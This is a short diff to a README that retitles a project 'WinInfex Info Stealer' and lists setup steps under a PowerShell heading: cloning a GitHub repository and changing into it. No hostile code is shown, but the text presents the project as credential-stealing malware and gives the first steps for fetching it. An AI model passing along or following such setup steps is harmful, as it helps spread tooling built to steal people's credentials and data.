@@ -1,4 +1,4 @@
-# WinInfex
+# WinInfex Info Stealer
 # Setup on PowerShell 
 - git clone https://github.com/vicouncil/WinInfex
 - cd WinInfex
